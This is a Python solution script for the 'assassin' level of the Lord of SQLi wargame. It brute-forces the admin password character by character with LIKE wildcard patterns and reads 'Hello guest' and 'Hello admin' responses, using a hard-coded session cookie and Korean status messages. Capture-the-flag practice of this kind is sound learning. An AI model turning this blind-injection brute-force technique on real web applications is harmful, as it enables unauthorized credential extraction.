import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie = "spin7uv9vl2fjnjet0tsug5eb6"
head = {"PHPSESSID":f"{cookie}"}

guest = ""
admin = ""
finish = False

print("💘 Brute Force를 시작합니다")

for len in range(1, 30):
    if (finish==True):
        break
    print(f"{len}번째 문자에 대해 검색중입니다..")
    for ran in range(48, 127):
        search = guest+chr(ran)
        param = f"?pw={search}%"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if ("Hello admin" in res.text):
            admin = search+"%"
            print(f"👏 적절한 검색어는 {admin}입니다!")
            finish = True
            break
        elif ("Hello guest" in res.text):
            guest += chr(ran)
            break
